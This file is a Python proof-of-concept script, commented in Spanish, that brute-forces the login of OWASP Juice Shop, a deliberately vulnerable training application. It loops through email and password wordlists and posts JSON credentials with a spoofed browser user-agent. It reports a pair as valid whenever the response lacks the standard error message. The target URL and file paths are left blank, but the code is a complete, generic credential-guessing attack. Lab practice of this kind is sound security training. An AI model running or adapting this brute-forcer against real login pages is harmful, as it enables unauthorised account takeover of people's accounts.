#!/usr/bin/env python3

"""
Prueba de concepto
Ataque de fuerza bruta a login de Owasp Juice Shop

Fernando Romero Cruz
NEKT Group
"""

# Imports
from json import dumps
from requests import Session

# Constantes
LOGIN_URL = ''

EMAIL_FILE = ''
PASSWD_FILE = ''

EMAIL_PARAM = ''
PASSWD_PARAM = ''

def main():
    """
    Función principal que implementa la fuerza bruta
    """
    with Session() as s:
        with open(EMAIL_FILE, 'r', encoding='utf-8') as user_reader:
            user_list = user_reader.readlines()
            for u in user_list:
                user_attempt = u.strip()

                with open(PASSWD_FILE, 'r', encoding='utf-8') as pass_reader:
                    passwd_list = pass_reader.readlines()

                    template_data = {
                        EMAIL_PARAM : user_attempt,
                        PASSWD_PARAM : ''
                    }

                    custom_headers = {
                        'Content-Type':'application/json',
                        'User-Agent':
                        'Mozilla/5.0 (X11; Linux x86_64; rv:128) Gecko/20100101 Firefox/128.0'
                    }

                    for p in passwd_list:

                        pass_attempt = p.strip()
                        print('\r'+' '* 30,flush=True, end='')
                        print(f'\r[-] Intentando con {user_attempt} : {pass_attempt}',
                              flush=True, end='')
                        template_data[PASSWD_PARAM] = pass_attempt

                        post_data = dumps(template_data)

                        response = s.post(LOGIN_URL,headers=custom_headers, data=post_data)

                        if 'Invalid email or password' not in response.text:
                            print()
                            print(f'[+] ¡¡Credenciales validas!!: {user_attempt} : {pass_attempt}')
                            break

if __name__ == '__main__':
    main()
